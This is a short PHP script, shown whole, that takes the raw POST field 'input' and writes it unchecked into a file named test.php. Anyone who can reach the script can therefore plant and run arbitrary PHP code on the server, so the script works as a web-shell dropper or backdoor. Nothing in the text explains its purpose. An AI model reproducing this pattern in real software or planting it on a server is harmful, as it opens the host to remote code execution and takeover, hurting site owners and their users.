<?php

$myfile = fopen("test.php", "w") or die("Unable to open file!");
$txt = $_POST['input'];
fwrite($myfile, $txt);
fclose($myfile);

?>